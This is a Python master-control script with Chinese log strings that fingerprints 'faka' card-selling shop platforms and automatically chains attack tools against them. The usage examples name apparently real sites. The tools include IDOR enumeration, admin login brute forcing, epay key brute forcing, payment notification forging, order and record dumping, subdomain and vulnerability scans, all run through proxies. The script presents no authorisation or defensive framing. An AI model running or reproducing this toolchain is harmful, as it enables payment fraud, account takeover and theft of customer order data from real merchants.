#!/usr/bin/env python3
"""
发卡渗透总控：指纹 → 自动跑对应工具链。

示例:
  python3 faka_run.py https://zhanghao9.com
  python3 faka_run.py https://zhanghao9.com --full
  python3 faka_run.py https://s.sggyx.com --token xiaoy --full
  python3 faka_run.py https://qq8.one --rainbow-range 1-500 --full
"""
from __future__ import annotations

import argparse
import json
import subprocess
import sys
from pathlib import Path

from faka_common import log, resolve_proxy
from faka_fingerprint import fingerprint

FAKA = Path("/data/tools/faka")


def run(cmd: list[str], dry: bool) -> None:
    log(f"{'[dry] ' if dry else ''}$ {' '.join(cmd)}")
    if not dry:
        subprocess.run(cmd, cwd=str(FAKA))


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="发卡渗透总控")
    ap.add_argument("url")
    ap.add_argument("--token", default="")
    ap.add_argument("--full", action="store_true", help="跑完整链含 login/epay/nuclei")
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--skip-fingerprint", action="store_true")
    ap.add_argument("--rainbow-range", default="1-200")
    ap.add_argument("--trade-seeds", default="")
    ap.add_argument("--proxy", default="auto")
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    url = args.url.rstrip("/")
    dry = args.dry_run
    proxy = resolve_proxy(args.proxy)
    proxy_arg = "none" if not proxy else args.proxy

    if not args.skip_fingerprint:
        fp = fingerprint(url)
        log(f"体系={fp.system} 置信={fp.confidence} 信号={fp.signals}")
        if fp.playbook:
            log(f"playbook: {fp.playbook}")
        system = fp.system
    else:
        system = "unknown"

    py = sys.executable

    if system == "acg" or system == "unknown":
        run([py, str(FAKA / "cors_scan.py"), "-u", url + "/user/api/site/info", "--proxy", proxy_arg], dry)
        if args.trade_seeds:
            seeds_file = FAKA / "out" / "_run_seeds.txt"
            seeds_file.write_text(args.trade_seeds.replace(",", "\n"), encoding="utf-8")
            run([py, str(FAKA / "acg_idor.py"), "-u", url, "--trade-list", str(seeds_file), "--xff", "--proxy", proxy_arg], dry)
        else:
            run([py, str(FAKA / "acg_idor.py"), "-u", url, "--proxy", proxy_arg], dry)
        domain = url.replace("https://", "").replace("http://", "").split("/")[0]
        run([py, str(FAKA / "sb_subdomain_scan.py"), domain, "--proxy", proxy_arg], dry)
        run([py, str(FAKA / "thinkphp_scan.py"), "-u", url, "--proxy", proxy_arg], dry)
        if args.full:
            run([py, str(FAKA / "acg_query_brute.py"), "-u", url, "--keyword", args.trade_seeds.split(",")[0] if args.trade_seeds else "test", "--proxy", proxy_arg], dry)
            run([py, str(FAKA / "acg_login_brute.py"), "-u", url, "--limit-pass", "1000", "--proxy", proxy_arg], dry)
            run([py, str(FAKA / "acg_shared_probe.py"), "-u", url, "--scan-range", "1-100", "--proxy", proxy_arg], dry)
            sb = f"https://sb.{domain}"
            run([py, str(FAKA / "sb_records_dump.py"), sb, "--max-pages", "50", "--proxy", proxy_arg], dry)
            run([py, str(FAKA / "epay_key_brute.py"), "-u", url, "--limit", "50000", "--proxy", proxy_arg], dry)
            run([py, str(FAKA / "notify_forge.py"), "-u", url, "--proxy", proxy_arg], dry)
            run(["bash", str(FAKA / "faka_nuclei.sh"), url], dry)
            run(["bash", str(FAKA / "faka_dirscan.sh"), url], dry)

    if system == "pyfaas" or "sggyx" in url:
        run([py, str(FAKA / "cors_scan.py"), "-u", url + "/shopApi/Shop/info", "-X", "POST", "-d", json.dumps({"token": args.token or "test"}), "--proxy", proxy_arg], dry)
        run([py, str(FAKA / "merchant_scan.py"), "-u", url, "--limit", "30", "--proxy", proxy_arg], dry)
        if args.token:
            run([py, str(FAKA / "shop_token_scan.py"), "-u", url, "--tokens", args.token, "--proxy", proxy_arg], dry)
        if args.full:
            run([py, str(FAKA / "pay_order_brute.py"), "-u", url, "--token", args.token or "test", "--goods", "test", "--probe", "price", "--proxy", proxy_arg], dry)
            run(["bash", str(FAKA / "faka_nuclei.sh"), url], dry)

    if system == "rainbow":
        start, end = args.rainbow_range.split("-", 1)
        host = url.replace("https://", "").replace("http://", "").split("/")[0]
        run([py, str(FAKA / "rainbow_idor.py"), "-u", url, "--start", start, "--end", end, "-w", "20", "--proxy", proxy_arg], dry)
        run([py, str(FAKA / "skey_chain.py"), "-H", host, "--skip-idor", "--proxy", proxy_arg], dry)
        if args.full:
            run([py, str(FAKA / "yanzu_idor_worker.py"), host, "/", "--start", start, "--end", end, "--proxy", proxy_arg], dry)
            run([py, str(FAKA / "rainbow_order_dump.py"), "-u", url, "--start", start, "--end", end, "--proxy", proxy_arg], dry)
            run(["bash", str(FAKA / "faka_nuclei.sh"), url], dry)

    if system == "pisces":
        run([py, str(FAKA / "pisces_dump.py"), url], dry)
        if args.full:
            run(["bash", str(FAKA / "faka_nuclei.sh"), url], dry)

    if system == "unknown":
        run([py, str(FAKA / "faka_fingerprint.py"), url], dry)
        run([py, str(FAKA / "thinkphp_scan.py"), "-u", url, "--proxy", proxy_arg], dry)
        run([py, str(FAKA / "js_api_extract.py"), url], dry)

    log("完成")


if __name__ == "__main__":
    main()
